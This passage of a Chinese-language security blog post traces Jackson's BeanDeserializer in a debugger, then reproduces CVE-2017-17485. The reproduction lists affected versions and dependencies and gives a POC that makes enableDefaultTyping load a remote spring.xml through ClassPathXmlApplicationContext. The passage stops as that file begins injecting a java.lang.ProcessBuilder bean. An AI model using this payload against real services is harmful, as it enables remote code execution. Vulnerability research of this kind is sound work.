            person<span class="token punctuation">.</span><span class="token function">setMysex</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">mysex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//objectMapper.enableDefaultTyping();</span>

        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
<span class="token comment">//            String json=objectMapper.writeValueAsString(person);</span>
<span class="token comment">//            System.out.println(json);</span>
            <span class="token class-name">Person</span> person1<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;\"name\":null,\"age\":0,\"mysex\":[\"mysex\",&#123;\"sex\":1&#125;]&#125;"</span><span class="token punctuation">,</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1x01-BeanDeserialzer–类的构造和-set-方法调用"><a href="#1x01-BeanDeserialzer–类的构造和-set-方法调用" class="headerlink" title="1x01 BeanDeserialzer–类的构造和 set 方法调用"></a>1x01 BeanDeserialzer–类的构造和 set 方法调用</h3><p>断点打在 readValue，然后跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710568701091-c21539f2-0675-441c-bad0-c7bdc13060d7.png#averageHue=%233e444e&clientId=uf4eba0d9-e83c-4&from=paste&height=100&id=uee4ab50e&originHeight=150&originWidth=1515&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=113113&status=done&style=none&taskId=u3ac0e47d-bcf5-420b-a439-510b0d83e91&title=&width=1010" referrerpolicy="no-referrer" alt="image.png"><br>这里直接跟进 _readMapAndClose 方法的内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710568633751-dc779c40-66fe-4b3f-a75e-d6a311aaa3fb.png#averageHue=%23434953&clientId=uf4eba0d9-e83c-4&from=paste&height=599&id=u33921e8d&originHeight=898&originWidth=1940&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=820012&status=done&style=none&taskId=u80759fee-1538-4c73-a003-dec6ce2ed3e&title=&width=1293.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>获取初始配置，然后读取 deseralizer 的解析器配置，然后调用其 deserialize 方法<br>在 deserialze 方法中直接调用到了<code>vanillaDeserialize</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710569419890-e524c36f-30c2-4ad2-8b36-7737873dee59.png#averageHue=%234c515e&clientId=uf4eba0d9-e83c-4&from=paste&height=259&id=ufb459729&originHeight=388&originWidth=1368&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=243367&status=done&style=none&taskId=u57913721-4ac3-403e-917d-4ace7f29ab8&title=&width=912" referrerpolicy="no-referrer" alt="image.png"><br>我们跟进<code>vanillaDeserialize</code>方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710569642078-4f4d3a53-6136-4362-9a08-c44a5da48612.png#averageHue=%233e444e&clientId=uf4eba0d9-e83c-4&from=paste&height=605&id=u6c65d7d9&originHeight=908&originWidth=1103&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=470020&status=done&style=none&taskId=u258c2dea-b4a0-450c-b637-607188030bf&title=&width=735.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>首先跟进<code>_valueInstantiator.createUsingDefault</code>方法<br>在<code>createUsingDefault</code>方法中由于在指定类中存在无参构造方法，所以这里会进入 trycatch 块，调入进<code>_defaultCreator.call()</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710569677785-b04d5f57-ab7c-4399-b0dd-f0ea1a422519.png#averageHue=%233f454f&clientId=uf4eba0d9-e83c-4&from=paste&height=409&id=ueddc3e61&originHeight=613&originWidth=1512&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=417739&status=done&style=none&taskId=u0aa85551-fe98-4cb9-8c76-24c609ed926&title=&width=1008" referrerpolicy="no-referrer" alt="image.png"><br>到 call 方法的内容就是无参构造的执行了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710569851898-83b98e21-1dcc-46cb-8244-a43fcaba42fd.png#averageHue=%23565a6a&clientId=uf4eba0d9-e83c-4&from=paste&height=179&id=ubb7d6e4c&originHeight=268&originWidth=1238&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=124428&status=done&style=none&taskId=u1ab327dd-6645-45c0-89b1-62cd8f38962&title=&width=825.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>我们看一下 console 的输出<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710569901527-e2e8651f-c993-4898-8e31-b77f9d7704af.png#averageHue=%2344454d&clientId=uf4eba0d9-e83c-4&from=paste&height=45&id=u600c3a4e&originHeight=68&originWidth=489&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12826&status=done&style=none&taskId=u73f908b4-1e1c-4b21-b77e-c2dc56c720d&title=&width=326" referrerpolicy="no-referrer" alt="image.png"><br><code> vanillaDeserialize()</code>方法调用完目标类的无参构造方法，生成实例化 bean 之后，就开始进入 do while 循环，读取字符串键值对中数据，据此来进行字段属性值赋值，其中会调用到 deserialzeAndSet 方法进行具体的操作<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570259332-a8746b3c-b2ae-4d79-9307-c7fb138e4965.png#averageHue=%233f454f&clientId=uf4eba0d9-e83c-4&from=paste&height=325&id=u0ac240ab&originHeight=488&originWidth=1032&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=224185&status=done&style=none&taskId=u092d4239-42c3-4daa-a72a-37d565e70a4&title=&width=688" referrerpolicy="no-referrer" alt="image.png"><br>开始跟进 deserializeAndSet<br>具体内容也很简单，他会匹配传入的键值对各自的属性，如果是普通类型就直接 invoke 调用 set 赋值了，如果是具体类情况的赋值，还会先调用 deserialze 方法对其解析<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570123302-f8c6299f-7446-4827-b06d-19681e60fedb.png#averageHue=%23444954&clientId=uf4eba0d9-e83c-4&from=paste&height=465&id=uaae7451e&originHeight=697&originWidth=1799&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=528107&status=done&style=none&taskId=udedd9659-1128-4f3b-8523-64f96bdd8ae&title=&width=1199.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>比如说我们当前 dowhile 大循环的中遍历到了 name 属性值，由于他是基本类型，直接 invoke 调用即可<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570458128-56fb787b-7112-458c-9e7f-68a35ababa93.png#averageHue=%23393e46&clientId=uf4eba0d9-e83c-4&from=paste&height=308&id=ub93ed4a8&originHeight=462&originWidth=2059&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=555858&status=done&style=none&taskId=u6cd1a329-c985-4739-8e58-5e4140eb25d&title=&width=1372.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>之后再调用两次，直接跟进到 mysex 变量的设置<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570632780-18d44578-6da7-4b9b-9a84-f8bf496bcf30.png#averageHue=%23474c58&clientId=uf4eba0d9-e83c-4&from=paste&height=293&id=u8bfc3588&originHeight=440&originWidth=1275&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=283299&status=done&style=none&taskId=u65ca6cb1-ee68-4024-889f-0ce8f8855ce&title=&width=850" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570529731-6efeafa7-765d-4bb5-b0c5-a848be08b25d.png#averageHue=%23393e46&clientId=uf4eba0d9-e83c-4&from=paste&height=314&id=u4ddd127d&originHeight=471&originWidth=2020&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=543948&status=done&style=none&taskId=u2c56e17a-a480-4423-86bd-ed1f359d9f8&title=&width=1346.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>发现他会走进<code>_valueDeserializer.deserializeWithType</code>的方法中<br>我们继续跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570705111-29d85fa3-49ca-4f5c-b266-bce1e3973c5d.png#averageHue=%234d515e&clientId=uf4eba0d9-e83c-4&from=paste&height=221&id=u57ffeae2&originHeight=331&originWidth=1616&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=242930&status=done&style=none&taskId=u9756fecf-3ef5-4558-a5b7-b0266987eae&title=&width=1077.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>判断我们当前要反序列化出来的东西是字段属性，于是进入 <code>JsonTokenId.ID_FIELD_NAME</code>的 case 情况<br>继续跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570853449-646c2938-78ae-4aa6-ba98-0bb5ed34d8f8.png#averageHue=%233f4753&clientId=uf4eba0d9-e83c-4&from=paste&height=125&id=u4fb0ee27&originHeight=187&originWidth=1158&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=118545&status=done&style=none&taskId=u34c10a2d-8a8c-4f88-96f7-48a43fb0db4&title=&width=772" referrerpolicy="no-referrer" alt="image.png"><br>最终我们回到了<code>BeanDeserialzer</code>的 deserialze 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710570894211-6b161791-04fb-4af4-877f-02cce1cd3b14.png#averageHue=%233f454f&clientId=uf4eba0d9-e83c-4&from=paste&height=254&id=u44efb794&originHeight=381&originWidth=1210&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=224275&status=done&style=none&taskId=uf3d616d0-2085-4256-a644-3b28c081f6e&title=&width=806.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>也就是说整个 Jackson 对于具体类的实例化操作都是遵循这一套组件和逻辑的。那么现在要反序列化的 mysex 实例化对象依然还是会走一遍我们上面分析的流程<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710571076850-9d3fa5b1-0484-4aed-b2ee-6be37f0e138d.png#averageHue=%233d444e&clientId=uf4eba0d9-e83c-4&from=paste&height=826&id=ua029c0ea&originHeight=1239&originWidth=2221&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1344477&status=done&style=none&taskId=ue06347c4-1f8d-41ad-869c-2e2573d8925&title=&width=1480.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>再看一眼 console 的消息输出<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710571114909-69beb1a6-27b0-4504-bbfe-a11c0bd6f1dd.png#averageHue=%2343454d&clientId=uf4eba0d9-e83c-4&from=paste&height=88&id=ue257a315&originHeight=132&originWidth=483&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=23778&status=done&style=none&taskId=uc4aead24-ee73-4878-ac1a-351303cfd72&title=&width=322" referrerpolicy="no-referrer" alt="image.png"><br>其实流程到这里就可以结束了，因为之后的赋值操作都会经过 dowhile 循环完成，我们需要的信息就是这一块无参构造调用流程，以及 set 方法的设置</p>
<h2 id="0x04-jackson-反序列化漏洞解析"><a href="#0x04-jackson-反序列化漏洞解析" class="headerlink" title="0x04 jackson 反序列化漏洞解析"></a>0x04 jackson 反序列化漏洞解析</h2><h3 id="1x01-前置条件"><a href="#1x01-前置条件" class="headerlink" title="1x01 前置条件"></a>1x01 前置条件</h3><p>其实只要满足我们上面关于”多态问题解决– JacksonPolymorphicDeserialization”中开启设置能够反序列化的过程中进一步反序列化字段属性的实例化对象就行，总结起来呢就是：</p>
<ul>
<li>调用了ObjectMapper.enableDefaultTyping()函数</li>
<li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解  </li>
<li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解</li>
</ul>
<p>三个任意满足一个就行<br>然后就是链子的逻辑合理性了，首先我们不可能遇到直接某一个类中的实例化方法或者 set 方法有命令执行的可能，必须一步一步调用寻找链子<br>上面其实包含了两种攻击思路：</p>
<ol>
<li>属性值有 object 属性的情况下，这种情况就算是为我们扩展了攻击面，我们就不必强求入口类的构造方法或者 set 方法有可能了，只需要保证其属性字段中 object 字段可控即可</li>
<li>属性值没有 object 属性的情况下，只能通过当前类的构造方法和 set 方法入手了</li>
</ol>
<p>漏洞复现阶段我没有去复现关于 templateImpl 的分析，直接来到后面的版本 （目前环境配置不出来）</p>
<h3 id="1x02-CVE-2017-17485-ClassPathXmlApplicationContext利用链"><a href="#1x02-CVE-2017-17485-ClassPathXmlApplicationContext利用链" class="headerlink" title="1x02  CVE-2017-17485  ClassPathXmlApplicationContext利用链"></a>1x02  CVE-2017-17485  ClassPathXmlApplicationContext利用链</h3><h4 id="2x01-影响版本"><a href="#2x01-影响版本" class="headerlink" title="2x01 影响版本"></a>2x01 影响版本</h4><p>Jackson 2.7系列 &lt; 2.7.9.2<br>Jackson 2.8系列 &lt; 2.8.11<br>Jackson 2.9系列 &lt; 2.9.4</p>
<h4 id="2x02-环境搭建"><a href="#2x02-环境搭建" class="headerlink" title="2x02 环境搭建"></a>2x02 环境搭建</h4><p>请注意，本次漏洞分析的环境依赖于 spring 等相关知识，所以可能会涉及 IOC 容器思想等 spring 中的特性<br>这是我的依赖</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.7.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.7.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-annotations<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.7.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>

  <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-beans<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-expression --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-expression<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-logging<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-logging<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面是测试代码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Vuln</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8000/spring.xml\"]"</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后这里我们还需要在本地（模拟远程端）写一个 spring.xml，向 IOC 容器中注入一个<code>java.lang.ProcessBuilder</code></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
